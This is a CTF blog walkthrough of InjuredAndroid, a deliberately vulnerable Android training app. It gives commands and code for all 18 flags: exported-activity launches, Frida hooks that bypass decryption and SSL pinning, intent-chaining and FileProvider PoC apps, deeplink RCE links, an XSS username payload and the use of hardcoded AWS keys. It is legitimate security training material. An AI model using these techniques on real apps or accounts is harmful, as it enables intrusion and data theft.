---
title: "InjuredAndroid — Complete CTF Walkthrough (18 Flags)"
date: 2026-09-22 09:20:00 +0000
categories: [Mobile Penetration Testing]
tags: [InjuredAndroid, Android, Frida, MobSF, CTF, Reverse Engineering]
description: "A flag-by-flag walkthrough of InjuredAndroid v1.0.9: hardcoded secrets, exported activities, insecure logging/storage, Firebase, deeplinks, RCE, FileProvider abuse, Flutter XSS and SSL pinning bypass."
author: Paschal Sangawe
toc: true
---

**InjuredAndroid** (by B3nac) is a deliberately vulnerable Android CTF app with **18 flags**. It is one of the best free ways to practise the full range of Android app security issues: hardcoded secrets, exported components, insecure storage, deeplinks, native bugs, Flutter-specific bugs, and dynamic instrumentation with Frida.

This is my flag-by-flag walkthrough. I ran the app on an emulator/rooted device and used jadx, apktool, adb, MobSF and Frida.

> **Authorisation:** InjuredAndroid is intentionally vulnerable and built for training. Everything below was run against my own local instance.

{% raw %}

## Setup

```bash
adb install InjuredAndroid_1.0.9_APKPure.apk
# package name
# b3nac.injuredandroid
```

Static analysis with jadx:

```bash
jadx -d out injuredandroid.apk
```

The app has a **PoC companion app** pattern for several flags: you build a tiny APK that fires intents at InjuredAndroid's exported components.

## Flag 1 — `F1ag_0n3`

A hardcoded string comparison in the source:
> **Picture goes here (#1).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `if (post.equals("F1ag_0n3")) { /* success */ }`.
> _Save as_ `images/injuredandroid-walkthrough/1.png` _then replace this block with_ `![Flag 1 — F1ag_0n3](/images/injuredandroid-walkthrough/1.png)`_._


```java
if (post.equals("F1ag_0n3")) { /* success */ }
```

Enter `F1ag_0n3` into the submit form.

> **Picture goes here (#2).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/2.png` _then replace this block with_ `![Flag 1 — F1ag_0n3](/images/injuredandroid-walkthrough/2.png)`_._

## Flag 2 — `S3cond_F1ag`

An **exported activity** can be started from outside the app:
> **Picture goes here (#3).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `adb shell am start -n b3nac.injuredandroid/.b25lActivity`.
> _Save as_ `images/injuredandroid-walkthrough/3.png` _then replace this block with_ `![Flag 2 — S3cond_F1ag](/images/injuredandroid-walkthrough/3.png)`_._


```bash
adb shell am start -n b3nac.injuredandroid/.b25lActivity
```

Or from a PoC app:

```java
Intent start = new Intent();
start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.b25lActivity");
startActivity(start);
```

> **Picture goes here (#4).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/4.png` _then replace this block with_ `![Flag 2 — S3cond_F1ag](/images/injuredandroid-walkthrough/4.png)`_._

## Flag 3 — `F1ag_thr33`

The comparison uses a string resource, so trace `R.string.cmVzb3VyY2VzX3lv` into `strings.xml`:
> **Picture goes here (#5).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>`.
> _Save as_ `images/injuredandroid-walkthrough/5.png` _then replace this block with_ `![Flag 3 — F1ag_thr33](/images/injuredandroid-walkthrough/5.png)`_._


```xml
<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>
```

> **Picture goes here (#6).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/6.png` _then replace this block with_ `![Flag 3 — F1ag_thr33](/images/injuredandroid-walkthrough/6.png)`_._

## Flag 4 — `4_overdone_omelets`

The value comes from a `Decoder` class holding a Base64 blob:
> **Picture goes here (#7).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `byte[] data = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", Base64.DEFAULT);`.
> _Save as_ `images/injuredandroid-walkthrough/7.png` _then replace this block with_ `![Flag 4 — 4_overdone_omelets](/images/injuredandroid-walkthrough/7.png)`_._


```java
byte[] data = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", Base64.DEFAULT);
```

Decode it:

```bash
echo NF9vdmVyZG9uZV9vbWVsZXRz | base64 -d   # 4_overdone_omelets
```

> **Picture goes here (#8).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/8.png` _then replace this block with_ `![Flag 4 — 4_overdone_omelets](/images/injuredandroid-walkthrough/8.png)`_._

## Flag 5 — `{F1V3!}`

Visiting `FlagFiveActivity` and iterating the broadcast three times reveals the flag via a decrypt call:
> **Picture goes here (#9).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `VGV4dEVuY3J5cHRpb25Ud28.decrypt("Zkdlt0WwtLQ=");`.
> _Save as_ `images/injuredandroid-walkthrough/9.png` _then replace this block with_ `![Flag 5 — {F1V3!}](/images/injuredandroid-walkthrough/9.png)`_._


```java
VGV4dEVuY3J5cHRpb25Ud28.decrypt("Zkdlt0WwtLQ=");
```

Trigger the activity three times (or hook the decrypt method with Frida) and read `{F1V3!}`.

> **Picture goes here (#10).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/10.png` _then replace this block with_ `![Flag 5 — {F1V3!}](/images/injuredandroid-walkthrough/10.png)`_._

## Flag 6 — `{This_Isn't_Where_I_Parked_My_Car}`

Hook the decryption method with Frida to recover the plaintext. `test.py`:
> **Picture goes here (#11).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `import time, frida`.
> _Save as_ `images/injuredandroid-walkthrough/11.png` _then replace this block with_ `![Flag 6 — {This_Isn't_Where_I_Parked_My_Car}](/images/injuredandroid-walkthrough/11.png)`_._


```python
import time, frida
device = frida.get_usb_device()
pid = device.spawn(["b3nac.injuredandroid"])
device.resume(pid)
time.sleep(1)
session = device.attach(pid)
script = session.create_script(open("test.js").read())
script.load()
input()
```

`test.js`:

```javascript
console.log("Script loaded successfully ");
Java.perform(function x() {
    var my_class = Java.use("b3nac.injuredandroid.VGV4dEVuY3J5cHRpb25Ud28");
    var string_class = Java.use("java.lang.String");
    my_class.decrypt.overload("java.lang.String").implementation = function (x) {
        console.log("Original arg: " + x);
        var my_string = string_class.$new("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==");
        var ret = this.decrypt(my_string);
        console.log("Return value: " + ret);
        return ret;
    };
});
```

Run:

```bash
frida -U -f b3nac.injuredandroid -l test.js --no-pause
```

> **Picture goes here (#12).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/12.png` _then replace this block with_ `![Flag 6 — {This_Isn't_Where_I_Parked_My_Car}](/images/injuredandroid-walkthrough/12.png)`_._

## Flag 7 — `S3V3N_11`

The flag password is an MD5 hash found in the SQLite database:
> **Picture goes here (#13).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `2ab96390c7dbe3439de74d0c9b0b1767  →  hunter2`.
> _Save as_ `images/injuredandroid-walkthrough/13.png` _then replace this block with_ `![Flag 7 — S3V3N_11](/images/injuredandroid-walkthrough/13.png)`_._


```text
2ab96390c7dbe3439de74d0c9b0b1767  →  hunter2
```

The flag URL is ROT47-encoded in the `Hide` class:

```java
private static String remoteUrl = "9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?";
```

ROT47-decodes to `https://injuredandroid.firebaseio.com/sqlite.json`. Enter both the password and the flag.

> **Picture goes here (#14).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/14.png` _then replace this block with_ `![Flag 7 — S3V3N_11](/images/injuredandroid-walkthrough/14.png)`_._

## Flag 8 — `C10ud_S3cur1ty_lol`

AWS credentials are hardcoded in `strings.xml`. Configure a profile:
> **Picture goes here (#15).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `[injuredandroid]`.
> _Save as_ `images/injuredandroid-walkthrough/15.png` _then replace this block with_ `![Flag 8 — C10ud_S3cur1ty_lol](/images/injuredandroid-walkthrough/15.png)`_._


```ini
[injuredandroid]
aws_access_key_id = <from strings.xml>
aws_secret_access_key = <from strings.xml>
```

Then list the bucket:

```bash
aws s3 ls s3://injuredandroid --profile injuredandroid
```

> **Picture goes here (#16).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/16.png` _then replace this block with_ `![Flag 8 — C10ud_S3cur1ty_lol](/images/injuredandroid-walkthrough/16.png)`_._

## Flag 9 — `[nine!_flag]`

The activity Base64-decodes the directory:
> **Picture goes here (#17).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `final String directory = "ZmxhZ3Mv";   // -> flags/`.
> _Save as_ `images/injuredandroid-walkthrough/17.png` _then replace this block with_ `![Flag 9 — [nine!_flag]](/images/injuredandroid-walkthrough/17.png)`_._


```java
final String directory = "ZmxhZ3Mv";   // -> flags/
```

Navigate to the Firebase endpoint:

```text
https://injuredandroid.firebaseio.com/flags.json
```

Base64-encode the returned flag to submit: `W25pbmUhX2ZsYWdd`.

> **Picture goes here (#18).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/18.png` _then replace this block with_ `![Flag 9 — [nine!_flag]](/images/injuredandroid-walkthrough/18.png)`_._

## Flag 10 — `John@Gıthub.com`

A **Unicode collision**: `toUpperCase(Locale.ROOT)` turns the dotless `ı` into `i`. Authenticate via the `QXV0aA` activity and submit the email with the dotless i:
> **Picture goes here (#19).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `adb shell am start -n b3nac.injuredandroid/.QXV0aA`.
> _Save as_ `images/injuredandroid-walkthrough/19.png` _then replace this block with_ `![Flag 10 — John@Gıthub.com](/images/injuredandroid-walkthrough/19.png)`_._


```bash
adb shell am start -n b3nac.injuredandroid/.QXV0aA
```

> **Picture goes here (#20).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/20.png` _then replace this block with_ `![Flag 10 — John@Gıthub.com](/images/injuredandroid-walkthrough/20.png)`_._

## Flag 11 — `HIIMASTRING`

Open the post form via deeplink, then pull the native binary from the APK:
> **Picture goes here (#21).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `adb shell am start -W -a android.intent.action.VIEW -d "flag11://"`.
> _Save as_ `images/injuredandroid-walkthrough/21.png` _then replace this block with_ `![Flag 11 — HIIMASTRING](/images/injuredandroid-walkthrough/21.png)`_._


```bash
adb shell am start -W -a android.intent.action.VIEW -d "flag11://"
# binary lives at res/values/meŉu
strings meŉu
```

> **Picture goes here (#22).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/22.png` _then replace this block with_ `![Flag 11 — HIIMASTRING](/images/injuredandroid-walkthrough/22.png)`_._

## Flag 12 — Protected intent via a PoC app

Chain an intent inside another intent to reach the protected activity:
> **Picture goes here (#23).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `Intent next = new Intent();`.
> _Save as_ `images/injuredandroid-walkthrough/23.png` _then replace this block with_ `![Flag 12 — Protected intent via a PoC app](/images/injuredandroid-walkthrough/23.png)`_._


```java
Intent next = new Intent();
next.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagTwelveProtectedActivity");
next.putExtra("totally_secure", "https://google.com");

Intent start = new Intent();
start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.ExportedProtectedIntent");
start.putExtra("access_protected_component", next);
startActivity(start);
```

> **Picture goes here (#24).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/24.png` _then replace this block with_ `![Flag 12 — Protected intent via a PoC app](/images/injuredandroid-walkthrough/24.png)`_._

## Flag 13 — `Treasure_Planet` (RCE via deeplink)

```bash
adb root && adb shell
cd /data/data/b3nac.injuredandroid/files
chmod +x narnia.x86_64
```
> **Picture goes here (#25).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `adb root && adb shell`.
> _Save as_ `images/injuredandroid-walkthrough/25.png` _then replace this block with_ `![Flag 13 — Treasure_Planet (RCE via deeplink)](/images/injuredandroid-walkthrough/25.png)`_._


Then use deeplinks to run the binary and combine the three parts:

```html
<html>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testOne">Test one!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testTwo">Test two!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testThree">Test three!</p>
<p><a href="flag13://rce?combined=Treasure_Planet">OH SNAP!</p>
</html>
```

> **Picture goes here (#26).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/26.png` _then replace this block with_ `![Flag 13 — Treasure_Planet (RCE via deeplink)](/images/injuredandroid-walkthrough/26.png)`_._

## Flag 14 — Flutter Stored XSS

The Flutter login stores the username and renders it unsafely. The Dart check is:
> **Picture goes here (#27).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `if (widget.test == "onclick=alert(1)") {`.
> _Save as_ `images/injuredandroid-walkthrough/27.png` _then replace this block with_ `![Flag 14 — Flutter Stored XSS](/images/injuredandroid-walkthrough/27.png)`_._


```dart
if (widget.test == "onclick=alert(1)") {
```

Log in with username `onclick=alert(1)`, then open the profile page — the XSS fires and the flag is set.

> **Picture goes here (#28).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/28.png` _then replace this block with_ `![Flag 14 — Flutter Stored XSS](/images/injuredandroid-walkthrough/28.png)`_._

## Flag 15 — `WIN`

The initial activity holds a byte array `[58,40,42]` to XOR back with a key hidden in `flutter.so`:
> **Picture goes here (#29).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `def encryptDecrypt(input):`.
> _Save as_ `images/injuredandroid-walkthrough/29.png` _then replace this block with_ `![Flag 15 — WIN](/images/injuredandroid-walkthrough/29.png)`_._


```python
def encryptDecrypt(input):
    key = ['M', 'A', 'D']
    output = []
    for i in range(len(input)):
        xor_num = ord(input[i]) ^ ord(key[i % len(key)])
        output.append(chr(xor_num))
    return ''.join(output)

data = [58,40,42]
print("".join(chr(x) for x in data))          # :(*
print(encryptDecrypt("".join(chr(x) for x in data)))  # WIN
```

> **Picture goes here (#30).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/30.png` _then replace this block with_ `![Flag 15 — WIN](/images/injuredandroid-walkthrough/30.png)`_._

## Flag 16 — `[Nice_Work]` (deeplink/CSP bypass)

The `CSPBypassActivity` accepts `http`/`https` on host `b3nac.com` with a `pathPattern="/.*/"`, and `httpToHttps()` rebuilds the URL from host+path. Use an `http` deeplink:
> **Picture goes here (#31).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `<html>`.
> _Save as_ `images/injuredandroid-walkthrough/31.png` _then replace this block with_ `![Flag 16 — [Nice_Work] (deeplink/CSP bypass)](/images/injuredandroid-walkthrough/31.png)`_._


```html
<html>
<a href="https://b3nac.com/anything/">Should get blocked</a>
<a href="http://b3nac.com/anything/">CSP Bypass</a>
</html>
```

Submit `[Nice_Work]`.

> **Picture goes here (#32).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/32.png` _then replace this block with_ `![Flag 16 — [Nice_Work] (deeplink/CSP bypass)](/images/injuredandroid-walkthrough/32.png)`_._

## Flag 17 — `Epic_Awesomeness`

Bypass the Flutter SSL-pinning plugin with Frida:
> **Picture goes here (#33).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `function disablePinning() {`.
> _Save as_ `images/injuredandroid-walkthrough/33.png` _then replace this block with_ `![Flag 17 — Epic_Awesomeness](/images/injuredandroid-walkthrough/33.png)`_._


```javascript
function disablePinning() {
    var SslPinningPlugin = Java.use("com.macif.plugin.sslpinningplugin.SslPinningPlugin");
    SslPinningPlugin.checkConnexion.implementation = function () {
        console.log("Disabled SslPinningPlugin");
        return true;
    };
}
Java.perform(disablePinning);
```

```bash
frida -U -f b3nac.injuredandroid -l flutter-plugin-ssl.js --no-pause
```

Intercept the request to `http://b3nac.com/Epic_Awesomeness` and read the flag.

> **Picture goes here (#34).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/34.png` _then replace this block with_ `![Flag 17 — Epic_Awesomeness](/images/injuredandroid-walkthrough/34.png)`_._

## Flag 18 — `034d361a5942e67697d17534f37ed5a9`

A **FileProvider** (`b3nac.injuredandroid.fileprovider`, `grantUriPermissions=true`) is reachable via the exported `FlagEighteenActivity`. A PoC app requests the file and reads the result:
> **Picture goes here (#35).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `Intent intent = new Intent();`.
> _Save as_ `images/injuredandroid-walkthrough/35.png` _then replace this block with_ `![Flag 18 — 034d361a5942e67697d17534f37ed5a9](/images/injuredandroid-walkthrough/35.png)`_._


```java
Intent intent = new Intent();
intent.setData(Uri.parse("content://b3nac.injuredandroid.fileprovider/files/test"));
intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagEighteenActivity");
startActivityForResult(intent, 0);

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    try {
        Log.d("OHNO", IOUtils.toString(Objects.requireNonNull(
            getContentResolver().openInputStream(Objects.requireNonNull(data.getData())))));
    } catch (IOException e) { e.printStackTrace(); }
}
```

Press back to trigger the log, read `text.txt`, then **MD5** it (`// MD5` hint in the submit function):

```text
034d361a5942e67697d17534f37ed5a9
```

> **Picture goes here (#36).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/injuredandroid-walkthrough/36.png` _then replace this block with_ `![Flag 18 — 034d361a5942e67697d17534f37ed5a9](/images/injuredandroid-walkthrough/36.png)`_._

## Lessons

- **Exported components are attack surface:** activities, receivers, services and providers must be explicitly non-exported unless required, and protected with permissions.
- **Never hardcode secrets:** strings.xml, source and native libraries are all trivially recoverable.
- **Storage:** shared prefs, SQLite, temp files and external storage leak credentials.
- **Deeplinks are user input:** validate scheme/host/path, and never feed deeplink data into file paths or shells.
- **Unicode collisions** defeat naive case-insensitive comparisons.
- **Dynamic analysis (Frida)** quickly defeats client-side crypto and pinning.

## Related posts

- [DIVA walkthrough](/posts/diva-walkthrough/)
- [AndroGoat walkthrough](/posts/androgoat-walkthrough/)
- [Insecure Data Storage](/posts/insecure-storage/)
- [Root Detection Bypass](/posts/root-detection/)

{% endraw %}
